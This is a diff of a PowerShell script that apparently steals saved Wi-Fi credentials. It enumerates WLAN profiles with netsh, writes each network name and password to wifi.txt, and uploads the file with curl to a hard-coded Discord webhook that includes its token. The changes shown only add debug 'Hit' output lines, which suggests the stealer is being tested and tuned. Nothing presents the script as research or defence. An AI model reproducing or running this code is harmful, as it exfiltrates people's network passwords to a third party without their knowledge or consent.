@@ -1,4 +1,4 @@
-
+Write-Output "Hit1"
 $webhookUrl  = 'https://discord.com/api/webhooks/1168997833945403443/b9KVbM7c72rekuk8um12U5Uz_9Elu_tz5aLeFKgzYBpK4MSQepewl3iDPtt4RrMGV3oG'
 
 $networks = netsh wlan show profiles
@@ -11,6 +11,7 @@ for($i = $begin; $i -le $end; $i++)
 {
 	$names += $networks[$i].substring($networks[$i].IndexOf(': ') + 2)
 }
+Write-Output "Hit2"
 
 
 foreach($network in $names)
@@ -37,6 +38,7 @@ foreach($network in $names)
 	$combo = $name + " - " + $pass
 	add-content -value $combo -path ".\wifi.txt"
 }
+Write-Output "Hit3"
 $file = Join-Path -Path $PWD -ChildPath "wifi.txt"
 curl.exe -F "file1=@$file" $webhookURL
-EXIT
+Write-Output "Hit4"
